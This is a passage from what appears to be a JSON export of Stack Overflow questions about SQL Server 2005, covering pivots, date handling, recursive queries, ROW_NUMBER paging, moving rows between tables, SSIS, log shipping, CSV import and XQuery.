detail from single query in SQL Server 2005","body":"<p>I am working with SQL Server 2005.</p>\n\n<p>I want to fetch <code>monthlyTotalAppoinment</code> and <code>monthlyEmployeewiseTotal</code> from <code>appointment</code> table in single result.</p>\n\n<p><strong>Appointment Table</strong> </p>\n\n<pre><code>appoinmentId\nappoinmentDate\nemployeeId\n</code></pre>\n\n<p>I can successfully fetch <code>monthlyTotalAppoinment</code> and also got <code>employeewisetotaappoinment</code> from following query, but I want monthly <code>employeewiseappoinment</code>.</p>\n\n<pre><code>SELECT * \n  FROM (SELECT Datename(M, Dateadd(M, NUMBER - 1, 0)) AS month \n          FROM MASTER..SPT_VALUES \n         WHERE TYPE = 'p' \n               AND NUMBER BETWEEN 1 AND 12) months \n       LEFT JOIN (SELECT Datename(MM, APPOINMENTDATE) month, \n                         Count(APPOINMENTID)          AS TotalAppointment \n                    FROM APPOINTMENT \n                   GROUP BY Datename(MM, APPOINMENTDATE)) appoinment \n              ON months.MONTH = appoinment.MONTH \n</code></pre>\n\n<p>I am getting following output.</p>\n\n<p><img src=\"http://i.stack.imgur.com/gkAas.png\" alt=\"enter image description here\"></p>\n\n<p>but I want following output</p>\n\n<p><img src=\"http://i.stack.imgur.com/2b72q.png\" alt=\"enter image description here\"></p>\n\n<pre><code>   appoinementId   employeeId   appoinemntDate  \n   -------------  -----------   ---------------\n    1                 4         8/25/2012 12:00:00 AM\n    2                 4         8/25/2012 12:00:00 AM\n    3                 4         8/25/2012 12:00:00 AM\n    4                 4         8/25/2012 12:00:00 AM\n    5                 4         8/25/2012 12:00:00 AM\n    6                 4         9/25/2012 12:00:00 AM\n    7                 2         9/25/2012 12:00:00 AM\n    8                 2         9/25/2012 12:00:00 AM\n    9                 2         9/25/2012 12:00:00 AM\n    10                4         9/25/2012 12:00:00 AM\n    11                4         10/25/2012 12:00:00 AM\n    12                2         10/25/2012 12:00:00 AM\n    13                4         10/25/2012 12:00:00 AM\n</code></pre>\n\n<p>for above data cuming output(For EmployeeId 4)</p>\n\n<pre><code>   Month           MonthData   Totalappoinemnt TotalEmployeewiseAppointmemt  \n   -------------  -----------   -------------- ------------------------------\n     January..      NULL..       NULL..          NULL..\n     Augest         Augest         5             9\n     September      September      5             9\n     October        October        3             9      \n</code></pre>\n\n<p>But i want following</p>\n\n<pre><code>     Month           MonthData   Totalappoinemnt TotalEmployeewiseAppointmemt  \n   -------------  -----------   -------------- ------------------------------\n    January..      NULL..       NULL..          NULL..\n     Augest         Augest         5             5\n     September      September      5             2\n     October        October        3             2       \n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12936006,"title":"How do I concatenate numbers to create a custom date?","body":"<p>Here is what I have tried thus far:</p>\n\n<pre><code>select CAST(\n    DATEPART(month,getDate())+'-'+\n    DATEPART(day,getDate())+'-'+\n    2012\n    as datetime)\n</code></pre>\n\n<p>I end up with the date: 1905-08-02 00:00:00.0. I was expecting to get today's date. I have rearranged the order and it doesn't seem to change. Can anyone offer as to why it gives me this? For the record, I plan to use other values than 2012 for the year.\nThanks in advance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":508,"score":4,"question_id":3751782,"title":"SQL Server 2005, Calculating upcoming birthdays from date of birth","body":"<p>This one has bugged me for a while now. Recently when revisiting some code I wrote for a customer a few years ago I was wondering if there is a more elegant solution to the problem.</p>\n\n<p>The customer stores all of their clients information including date of birth (date time field)</p>\n\n<p>They run an extract every Monday that retrieves any customer whose birthday will fall within the following week.</p>\n\n<p>I.e. if the extract was run on Monday Jan 1st, Customers whose birthday fell between (and including) Monday Jan 8th -> Sunday Jan 14th would be retrieved.</p>\n\n<p>My solution was to use the Datepart(dy) function and calculate all upcoming birthdays based off the customers date of birth converted to day of year, adding some logic to include for the extract being run at the end of a year.\nThe problem was that using Day of year throws results off by 1 day if the customer was born on a leap year and / or the extract is run on a leap-year after the 29th of Feb, so once again I had to add more logic so the procedure returned the expected results.</p>\n\n<p>This seemed quite over-kill for what should be a simple task\nFor simplicity let’s say the table 'customer' contains 4 fields, first name, last name, dob, and address.</p>\n\n<p>Any suggestions on how to simplify this would really be appreciated</p>\n\n<p>Wes</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2409,"score":2,"question_id":1486332,"title":"Get comma separated value from multiple row in sql server 2005","body":"<p>i have this table</p>\n\n<blockquote>\n<pre><code>Cream\n----------\nCHOCALATE\nGREEN\nTEST\n</code></pre>\n</blockquote>\n\n<p>want out put in select query like this</p>\n\n<h2>cream</h2>\n\n<p>CHOCALATE,GREEN,TEST</p>\n"},{"tags":["sql-server-2005","recursion"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12939593,"title":"Recursively get data from a query result in SQL","body":"<p>SQL gurus</p>\n\n<p>I have a table structure as follows </p>\n\n<pre><code>Id        Name        IdPartner\nId1       name1           \nId2       Name2       Id1\nId3       name3       Id1\nId4       name4       Id2\nId5       name5       Id3\n</code></pre>\n\n<p>I need to write a query that would recursively loop through the table to find the partners. </p>\n\n<p>I.e Given an Id say Id1 here, I need to pull out all the Names where Id1 is listed as a partner, So my query need to pull up Name3 and Name2. Subsequently in the same query I also need to pull the names where Name3 and Name2 are also listed as partners. So in this case if I give the input to the SP as Id1 I should effectively get a list that read as below </p>\n\n<pre><code>   Id          Name\n  Id2         name2\n  Id3         name3\n  Id4         name4\n  Id5         name5\n</code></pre>\n\n<p>I havent worked with recursively getting the data in SQL. Someone told me I could use a common table expression, but I fail to see how that would help me. I have been breaking my head over this for over a day and all I can come up with is the idea of using a cursor.</p>\n\n<p>Any help in this regard helps</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12914888,"title":"need to use ROW_NUMBER without over in sqlserver 2005","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12914499/row-number-without-over-in-sql\">ROW_NUMBER() without over in SQL</a>  </p>\n</blockquote>\n\n\n\n<p>I have a grid with sorting on each column and have to show only 50 rows at a time.</p>\n\n<p>I am using sql server 2005 as database. </p>\n\n<p>Now there is ROW_NUMBER function in sql server 2005 to filter the data with row number but <code>Over(order by [Column])</code> is mandatory to use. In my case I have to sort my grid with different columns so I can not use the static columns name in order by clause. The restriction is , I have to use static query.</p>\n\n<p>Can you guys help me out on this problem?</p>\n"},{"tags":["database","query","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12914499,"title":"ROW_NUMBER() without over in SQL","body":"<p>Is there any way to use <code>ROW_NUMBER()</code> in SQL without using <code>OVER</code>, because I want to use sorting. </p>\n\n<p>I have a Grid with multiple sortable columns with configurable rows. In my scenario order by is variable that's why I am not able to put order by using ROWNUM.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12932045,"title":"Cross Join without duplicate combinations","body":"<p>I know this question is very similar to this one:\n<a href=\"http://stackoverflow.com/questions/12490244/symmetric-cross-join\">Symmetric cross join</a>\nand this one too:\n<a href=\"http://stackoverflow.com/questions/7112513/combinations-not-permutations-from-cross-join-in-sql\">combinations (not permutations) from cross join in sql</a></p>\n\n<p>But what about if we have two different tables, say A and B:</p>\n\n<pre><code>select A.id,B.id from A cross join B\n</code></pre>\n\n<p>but I want to consider the pair <code>(a,b)</code> equal to <code>(b,a)</code></p>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12617753,"title":"Pass SSIS variable to Process task","body":"<p>How to pass variables defined in SSIS as parameters to SSIS Process task that runs a bat file.</p>\n\n<p>In the bat file the user name and password would be replaced with %1 argument and input will be passed from the script task that will receive input from a .NET front-end.</p>\n\n<p>Please do help with screenshots if possible</p>\n\n<p><img src=\"http://i.stack.imgur.com/4axbV.png\" alt=\"enter image description here\"></p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12947743,"title":"Retreive data column wise in sqlserver","body":"<p>I have a problem where  i need to display subject names(ex- english,science ....)  of student as columns  and under each subject their respective marks . i  query a database and  get these values as rows in dataset not as columns.How should i query the database</p>\n\n<p>my query result</p>\n\n<pre><code>student name | marks  | Subectname\n\nraghuram        78         english\n\nraghuram        34         physics\n\nraghuram        76         chemistry\n</code></pre>\n\n<p>................              ...         ..........</p>\n\n<pre><code>Required Result  in Report\n\nstudentname | english | Maths | physics | ......\n\nraghuram        78       66        32\n</code></pre>\n\n<p>Heres my query</p>\n\n<pre><code>Select st.FirstName+' '+st.LastName as StudentName,s.Subject_Name,se.Mark from   dbo.FEE_STUDENT_EXAM se\ninner join dbo.FEE_STUDENT_GRADE sg on sg.Student_ID=se.Student_ID\ninner join FEE_STUDENT st on st.Student_ID=sg.Student_ID\ninner join dbo.EMP_SUBJECT s on s.SubjectID=se.Subject_ID\nwhere sg.Grade_ID=@GradeId and sg.Division_ID=@DivId and\nse.Subject_ID in(Select  d.SubjectId from dbo.FEE_STUDENT_EXAM_SCHEDULED d inner join \ndbo.FEE_STUDENT_EXAM_SCHEDULEH h on h.ExamScheduleID=d.ExamScheduleID where \nh.Grade_Id=@GradeId and h.Division_ID=@DivId and year(cast (d.TestDate as datetime))=@Year\nand month(cast (d.TestDate as datetime))=@Month)\n</code></pre>\n"},{"tags":["vb.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12946904,"title":"Switch between connection string at runtime","body":"<p>I need to switch between some databases at the same time (using VB.net). As far as I know, I must create some connection Strings and use them in different conditions.</p>\n\n<p>For example </p>\n\n<pre><code>If ( condition )  then \n  use connection String 1\nelseif (condition)  then \n  use connection String 2 \nend if \n</code></pre>\n\n<p>Can anyone help me how to handle this?\nI'm using MSSQL 2005 and VB.net </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12947045,"title":"How to copy the table with values from one database to another database table?","body":"<p>I Create the table <strong>abc under test</strong> database.And I create <strong>bcd table under test1</strong>.The bcd,abc table fields are same.abc table have the data. Now,<strong>How to copy the abc table values to bcd table in sql server 2005</strong>?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2918,"score":1,"question_id":6071883,"title":"Conversion failed when converting the nvarchar value '' to data type int","body":"<p>While this may sound like a beginner 101 problem I think it is a bit more complicated.</p>\n\n<p>I have two instances of SQL server, one is a log-shipped read/only standby copy of the master database that is used for reporting purposes.</p>\n\n<p>They are both 64-bit SQL 2005, SP3.</p>\n\n<p>The LogShipped Instance is: 9.00.4035.00 (Standard Edition)\nThe Original Instance is: 9.00.4035.00 (Enterprise Edition) in an Active / Passive Cluster.</p>\n\n<p>Server collation is Latin1_General_CI_AI on both and they both run on Server 2003 64 bit.</p>\n\n<p>I have a query that runs and executes fine on the master database server but it fails on the standby / read-only copy with a conversion of nvarchar to int.</p>\n\n<p>The code is identical and i've copied and pasted it from the main instance query window just to double check.</p>\n\n<p>Is there a bug in SQL server somewhere? I can paste the query if needed (its a bog-standard select with some in-line tables)</p>\n\n<p>Just don't understand why it works on the one yet the log-shipped copy fails.</p>\n\n<p>Any pointers is much appreciated.</p>\n\n<p>-- Edit</p>\n\n<p>I have found the culprit.. the transaction log database contains invalid data that isn't in the primary database.. quite why they are out of sych I do not know yet as the transaction log shipping is still working and I have no errors in the job-history.</p>\n\n<p>Just a few orphaned records that are invalid that are not in the primary db.. how odd</p>\n"},{"tags":["sql","sql-server","sql-server-2005","csv","bulkinsert"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12945610,"title":"How to import CSV to SQL Server 2005 w/o BCP?","body":"<p>I am working on a ColdFusion (feel free to laugh) 8 site that that is hosted in a shared environment. The database and the web server are separate boxes. We don't have root access to either, and we don't have \"exec xp_cmdshell\" permission. SQL Server version is 2005. </p>\n\n<p>So, what is the closest equivalent to BULK INSERT that we should try if we would like to efficiently import a CSV or other text file into the database--but without BCP or \"format files\"? </p>\n\n<p>Obviously, we could just build a massive INSERT statement in ColdFusion, with UNION ALLs for each row, and run that. But is that the best option? Your thoughts?</p>\n"},{"tags":["sql","sql-server-2005","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12921907,"title":"Update a whole column based on 2 columns of a different table","body":"<p>I added a new column to a table. The columns of the table are:</p>\n\n<pre><code>Identifier(unique identity but not joinable to the other table)\nClinicalID(int)\nsenttime(datetime)\norgID(int-new column)\n</code></pre>\n\n<p>I need to update the new column from a different table based on the sent time. \nI should check on what date range the sent time falls and update the orgID accordingly.\nColumns of the other table:</p>\n\n<pre><code>ClinicalIDentifier\norg ID(int) \nold orgID(int)\neffectivefromtime\neffectivethrutime\n</code></pre>\n\n<p>The issue I am facing is that if the senttime is > effective fromtime of the other table, it displayes the other org IDs of the same ClinicalID where the  senttime is > effective fromtime.</p>\n\n<p>I am stuck at comparing date ranges. </p>\n\n<p>Please let me know if you require any further information</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12944094,"title":"pivot to total per week","body":"<p>I have a query that i am trying to write to return the amount of times and instance occurs in a database and group by week and product as defined by the database. below is my query:</p>\n\n<pre><code>SELECT WeekCompleted, Product, COUNT(OrderNumber) as CorrectionCount FROM(\nSELECT \np.Abbreviation as Product\n,CAST(oi.OrderID as VARCHAR(MAX))+'.'+CAST(oi.OrderItemID as VARCHAR(MAX)) AS OrderNumber\n,CASE\n    WHEN o.ClientID IN (56156, 56394) \n        THEN DATEADD(week, datepart(ww, dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 80)) \n            - 1, DATEADD(DAY, @@datefirst - DATEPART(weekday, CAST(YEAR(GETDATE()) AS VARCHAR)\n            + '-01-01') - 6, CAST(YEAR(GETDATE()) AS VARCHAR) + '-01-01'))\n    ELSE DATEADD(week, datepart(ww, dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 130)) \n    - 1, DATEADD(DAY, @@datefirst - DATEPART(weekday, CAST(YEAR(GETDATE()) AS VARCHAR)\n    + '-01-01') - 6, CAST(YEAR(GETDATE()) AS VARCHAR) + '-01-01')) \n    END AS WeekCompleted\n,CASE   \n    WHEN o.ClientID IN (56156,56394) THEN dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 80)\n    ELSE dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 130) END AS LastCompleted\nFROM\nOrderItems oi\nLEFT JOIN OrderItemMilestones oim on oim.OrderID = oi.OrderID and oim.OrderItemID = oi.OrderItemID\nJOIN Products p on p.ProductID = oi.ProductID\nJOIN Orders o on o.OrderID = oi.OrderID\nWHERE\noim.MilestoneID = 90\nand QueueID = 0\n) src\nWHERE LastCompleted &gt;= '2012-10-01'\nGROUP BY WeekCompleted, Product\n</code></pre>\n\n<p>here is more info needed</p>\n\n<pre><code> dbo.getlatestmilestonedate() returns a datetime date in this format: mm:dd:yyyy hh:mm:ss\n</code></pre>\n\n<p>and a sample table of data i currently have:</p>\n\n<pre><code>WeekCompleted           Product    CorrectionCount\n2012-09-30 00:00:00.000 Product1    5\n2012-10-07 00:00:00.000 Product1    7\n2012-10-14 00:00:00.000 Product1    7\n2012-09-30 00:00:00.000 Product2    18\n2012-10-07 00:00:00.000 Product2    28\n2012-10-14 00:00:00.000 Product2    16\n</code></pre>\n\n<p>This data is returning exactly how i want it to so no change is needed to the original data unless needed to accomplish final goal, which is this:</p>\n\n<pre><code>WeekCompleted               Product1        Product2\n2012-09-30 00:00:00.000      5                18\n2012-10-07 00:00:00.000      7                28 \n2012-10-14 00:00:00.000      7                16\n</code></pre>\n\n<p>I think i need to pivot this, but every time i try i only run into syntax errors and dont quite yet understand the pivot syntax.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12461892,"title":"views not refreshing /sp_refreshview taking time for certain views even though there is no data in the view","body":"<p>I have got 2 client's databases(client1 and client 2).As a part of testing, I have restore those 2 databases in my local server.</p>\n\n<p>Views are created in a database called configDB(same server) and are pointing to  tables in a database  called CurrentsourceDB(data of client1).Now I have \nrenamed the CurrentsourceDB to CurrentsourceDB_old and \nsource2db(data of client2) to CurrentsourceDB\n(client1's data db and client2's data db both have same objects, same structure. The only difference is with data ).\nNow when I query the view it has to show data based on source2db(client2's data) But it still shows data based on source1(client1's data).</p>\n\n<p>So I have to either refresh all the view or just alter all the views then I can see the view's data based on present source database,source2db\nWhy does it happen, and is there any way to resolve the problem apart from refreshing?</p>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12919061,"title":"Report Parameter Values in SSRS","body":"<p>I need to generate semi-monthly (1-15 and 16-last day of month) and monthly reports based on the same report template. I put two parameters on the report template. The second parameter will be the date of execution, which it 15 and last day of month. I can define it on the report parameter when I design the report. I do not want to create 3 report templates to take care of it. Do you know how I can define the 1st and 16th of each month on the first Report Parameter Values in report subscription on the report manager. Thank you in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","group-by","aggregate"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12937878,"title":"Retrieve row of aggregate on primary key with group by","body":"<p>Ok so I know you can't pull specific fields without an aggregate when you perform a SQL command with a group by, but it seems to me that if you are doing an aggregate on a primary key that is guaranteed to be unique, there should be a way to pull the other rows of that column along with it.  Something like this:</p>\n\n<pre><code>SELECT Max(id), \n       foo, \n       bar \nFROM   mytable \nGROUP  BY value1, \n          value2 \n</code></pre>\n\n<p>So ID is guaranteed to be unique, so it will have exactly 1 value for foo and bar, is there a way to generate a query like this?</p>\n\n<p>I have tried this, but MyTable in this case has millions of rows, and the run-time for this is unacceptable:</p>\n\n<pre><code>SELECT * \nFROM   mytable \nWHERE  id IN (SELECT Max(id) \n              FROM   mytable \n              GROUP  BY value1, \n                        value2) \n       AND ...\n</code></pre>\n\n<p>Ideally I would like a solution that works at least as far back as SQL server 2005, but if there are better solutions in the later versions I would like to hear them as well.</p>\n"},{"tags":["sql-server-2005","xquery","exists"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12931329,"title":"XQuery exists method","body":"<p>I am trying to get the following exists function to work, but I'm obviously doing something wrong. Essentially, what I want to see is a bit indicating if Exerciser <strong>EVER</strong> contained Y. So in my resultset I'd have rn = 1 with start and end dates for Exerciser X, but a bit indicating true as some previous results contained an Exerciser = \"Y\". </p>\n\n<p>Any help and explanation of what I am doing wrong is much appreciated. I was following (or at least trying to) examples specified <a href=\"http://www.simple-talk.com/sql/learn-sql-server/the-xml-methods-in-sql-server/\" rel=\"nofollow\">here</a> if that helps. My current broke query is as follows. If you comment out the last column (PreviouslyContainedY) it will show you some results.</p>\n\n<p><strong>Edit:</strong> I've got it working now on a 2008 instance with my modified SQL. I expect it'll work on 2005, but I'll have to wait till I'm back at work to test it. My problem now is, I don't understand why my first attempt didn't work. I thought I could reference Exerciser in the exists method in much the same way I am referencing it in line above (column alias \"Exerciser\"). Can someone explain what was wrong with my first attempt? </p>\n\n<pre><code>DECLARE @x XML = '&lt;Root xmlns=\"http://myurl.com/services/\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n&lt;Things&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2007-03-31&lt;/EndDate&gt;\n      &lt;StartDate&gt;1998-01-01&lt;/StartDate&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-03-31&lt;/EndDate&gt;\n      &lt;StartDate&gt;2007-04-01&lt;/StartDate&gt;\n      &lt;EndReasonCode&gt;10&lt;/EndReasonCode&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-06-28&lt;/EndDate&gt;\n      &lt;StartDate&gt;2012-04-23&lt;/StartDate&gt;\n      &lt;EndReasonCode&gt;20&lt;/EndReasonCode&gt;\n      &lt;Exerciser&gt;Y&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n    &lt;Thing&gt;\n      &lt;EndDate&gt;2012-09-30&lt;/EndDate&gt;\n      &lt;StartDate&gt;2012-06-29&lt;/StartDate&gt;\n      &lt;Exerciser&gt;X&lt;/Exerciser&gt;\n    &lt;/Thing&gt;\n  &lt;/Things&gt;&lt;/Root&gt;'\n\n  ;WITH XMLNAMESPACES ('http://myurl.com/services/' AS p)\n\nSELECT ROW_NUMBER() OVER (ORDER BY rp.regperiod.value ('(p:StartDate/text())[1]','varchar(20)') DESC) AS rn,\n       rp.regperiod.value ('(p:StartDate/text())[1]','varchar(20)') AS StartDate,\n       rp.regperiod.value ('(p:EndDate/text())[1]','varchar(20)') AS EndDate, \n       rp.regperiod.value ('(p:Exerciser/text())[1]','varchar(200)') AS Exerciser,\n       -- rp.regperiod.exist('[p:Exerciser=\"Y\"]')  AS PreviouslyContainedY\n       -- The following change works. I don't understand why the line above doesn't though.\n       x.exist('/p:Root/p:Things/p:Thing[p:Exerciser=\"Y\"]')  AS PreviouslyContainedY\n\nFROM (\n    SELECT @x AS x \n    ) y CROSS APPLY y.x.nodes('/p:Root/p:Things/p:Thing') rp(regperiod)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12935103,"title":"First INSERT, then - if OK - DELETE","body":"<p>This SQL SERVER 2005 statement first deletes 18 record ordering them by <code>FIELD1 ASC</code>, then inserts the same 18 records in a clone table:</p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\nOUTPUT DELETED.* INTO TableNew\n</code></pre>\n\n<p>Please help me to convert the previous statement in order to first <code>INSERT</code>, and <code>THEN</code> - <code>IF INSERT</code> HAS BEEN OK - delete the same 18 records; I've just tried but the following code gives the error, </p>\n\n<p><code>Msg 102, Level 15, State 1, Line 7 Incorrect syntax near 'INSERTED'.</code></p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY ID_OL ASC /* You may want to add ORDER BY here */\n        )\ninsert into tablenew select * from q OUTPUT INSERTED.* INTO TABLENEW\n</code></pre>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql-server-2005","ssis","management-studio"],"answer_count":4,"favorite_count":2,"up_vote_count":19,"down_vote_count":0,"view_count":38004,"score":19,"question_id":888709,"title":"How do I view the SSIS packages in SQL Server Management Studio?","body":"<p>Argh! I created an SSIS package via an Import Wizard and I can't find the SSIS packages on the server using Management Studio. Execute an SSIS package doesn't appear as an option when I go into job scheduler, either.</p>\n"},{"tags":["database","eclipse","sql-server-2005","birt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1502,"score":1,"question_id":5323883,"title":"BIRT: how to connect to SQL Server 2005","body":"<p>I am having trouble writing the database URL for a SQL Server 2005 database when creating a data source for a BIRT report. The URL I have written looks like this:</p>\n\n<pre><code>jdbc:microsoft:sqlserver://host:port;databasename=name;user=userName;password=yourPwd\n</code></pre>\n\n<p>I placed the sqljdbc.jar (jdbc 3.0) in the following location:</p>\n\n<pre><code>eclipse/plugins/org.eclipse.birt.report.data.oda.jdbc_2.6.1.v20100909/drivers\n</code></pre>\n\n<p>When I press the \"Test Connection\" button in the \"Edit Data Source\" dialog I get the following error:</p>\n\n<pre><code>The selected driver cannot parse the given url.\n</code></pre>\n\n<p>Can you give me any hints on how to solve this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12932126,"title":"INSERT into another table, and then DELETE from the source table","body":"<p>How can I delete the first 18 rows (sorted by FIELD1) from the \"pippo\" table, and then insert THE SAME 18 rows in another clone-table called minnie?</p>\n\n<p>The following code extracts the first 18 rows ordering by FIELD1, and then deletes them:</p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\n</code></pre>\n\n<p>How can I insert the same 18 rows into the minnie table, before deleting them?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12931590,"title":"Are Select Top(n) and Delete Top(n) same?","body":"<p>If use the select statement:</p>\n\n<pre><code>select top (18) * from pippo;\n</code></pre>\n\n<p>And I use the delete statement:</p>\n\n<pre><code>delete top (18) from pippo;\n</code></pre>\n\n<p>I would like to know if the 18 selected and deleted rows are the same.<br>\nAny help?</p>\n\n<p>EDIT after having accepted the answer:</p>\n\n<p>I have found the following solution here: <a href=\"http://stackoverflow.com/questions/733668/delete-the-first-record-from-a-table-in-sql-server-without-a-where-condition\">Delete the &#39;first&#39; record from a table in SQL Server, without a WHERE condition</a></p>\n\n<pre><code>WITH  q AS\n        (\n        SELECT TOP 18 *\n        FROM    pippo\n        ORDER BY FIELD1 ASC /* You may want to add ORDER BY here */\n        )\nDELETE\nFROM    q\n</code></pre>\n\n<p>With this solution I sort all the \"pippo\" table by FIELD1, and then I delete the first 18 rows. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","index"],"answer_count":3,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":955,"score":7,"question_id":2292662,"title":"How important is the order of columns in indexes?","body":"<p>I've heard that you should put columns that will be the most selective at the beginning of the index declaration.  Example:</p>\n\n<pre><code>CREATE NONCLUSTERED INDEX MyINDX on Table1\n(\n   MostSelective,\n   SecondMost,\n   Least\n)\n</code></pre>\n\n<p>First off, is what I'm saying correct?  If so, am i likely to see large differences in performance by rearranging the order of the columns in my index or is it more of a \"nice to do\" practice?</p>\n\n<p>The reason I'm asking is because after putting a query through the DTA it recommended that I create an index that had almost all of the same columns in it as an existing index, just in a different order.  I was considering just adding the missing columns to the existing index and calling it good.  Thoughts?</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2000","replication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12918131,"title":"How can I modify a trigger at subscribers SQL Server 2005?","body":"<p>I have a SQL Server 2005 publisher with SQL Server 2005 subscribers and one SQL Server 2000 subscriber running merge replication. </p>\n\n<p>Is there anyway to modify triggers at a subscriber with the replicating schema changes set to false (<code>replicate_ddl = 0</code>) without reintializing the whole publication? </p>\n\n<p>A solution where the triggers are only modified on the SQL Server 2005 databases is fine. Thank you.  </p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":113,"score":0,"question_id":12914959,"title":"Cannot bulk load because the file could not be opened. Operating system error code 21(The device is not ready.)","body":"<p>Cannot bulk load because the file could not be opened. Operating system error code 21(The device is not ready.).</p>\n\n<p>Hi All, </p>\n\n<p>I am a newbie to Image Upload in MS SQL Server using ASP.NET. its cool to upload a image in a query from the same machine as the server but when from a remote machine ASP.NET web application to MS SQL Server, I am getting the above mentioned error. </p>\n\n<p>I don't understand what needs to be done, i have seen several threads and forums but i am not able to understand, can you please help me out on the same. I am looking for some descriptive steps to fix this issue.</p>\n\n<pre><code>Session[\"FileName\"] equals some d drive file\n</code></pre>\n\n<p><strong>Query I use:</strong></p>\n\n<pre><code>command.CommandText = \"UPDATE user_info \"\n                                + \"SET User_Image = (SELECT * FROM Openrowset(Bulk '\" + Session[\"FileName\"] + \"', Single_Blob) AS User_Image) \"\n                                + \"WHERE id =\" + \"22222\";\n</code></pre>\n\n<ul>\n<li><p><strong>I use SQL Authentication</strong></p></li>\n<li><p><strong>I have enabled both named pipes + TCP/IP</strong></p></li>\n<li><p>if <strong>EXECUTE AS</strong> is to be used, can someone explain the query. Is there any setting that need to be enabled. I am desperate :(</p></li>\n</ul>\n\n<p>Thanks in advance !</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12923370,"title":"Serial Number in the form of week number in query","body":"<p>I have used this to get the serial number and count of distinct RepID's for each week. But instead of Serial number(1, 2, 3), I want the serial number value as Week 1, week 2, week 3. How is it possible? This is using SQL Server 2005.Thank you!</p>\n\n<pre><code>Select ROW_NUMBER() OVER (ORDER BY Date) As SlNo, 